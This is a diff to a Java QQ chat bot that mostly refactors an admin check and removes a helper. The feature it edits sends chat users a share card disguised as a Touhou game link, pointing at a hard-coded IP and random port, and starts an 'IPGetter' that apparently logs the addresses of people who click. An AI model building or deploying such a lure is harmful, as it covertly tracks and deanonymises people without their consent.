@@ -258,7 +258,7 @@ public class Methods {
     }
 
     public static boolean checkXiong(long fromQQ, String msg) {
-        if (fromQQ == 3291680841L || fromQQ == 2842589457L || fromQQ == 2856986197L) {
+        if (Autoreply.instence.configManager.isAdmin(fromQQ)) {
             if (msg.equals("吊熊")) {
                 int port = Autoreply.instence.random.nextInt(5000);
                 Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000),
@@ -269,8 +269,6 @@ public class Methods {
                 timer.schedule(new TimerTask() {
                     @Override
                     public void run() {
-                        // Autoreply.sendMessage(ipGetter.fromGroup, 0, "当前有" +
-                        // ipGetter.hSet.size() + "个小伙伴看了群聊");
                         ipGetter.running = false;
                     }
                 }, 200000);
@@ -280,7 +278,7 @@ public class Methods {
                 int port = Autoreply.instence.random.nextInt(5000);
                 Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000),
                         "东方绀珠传LNB", "东方绀珠传LNB", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
-                final XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
+                XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
                 ipGetter.start();
                 return true;
             }
@@ -324,15 +322,6 @@ public class Methods {
             return true;
         }
         return false;
-    }
-
-    // 图片搜索专用的消息发送
-    public static void sendMsg(long fromGroup, long fromQQ, String msg) {
-        if (fromGroup == 0) {
-            Autoreply.sendMessage(0, fromQQ, msg);
-        } else {
-            Autoreply.sendMessage(fromGroup, 0, Autoreply.instence.CC.at(fromQQ) + msg);
-        }
     }
 
     public static void setRandomPop() {
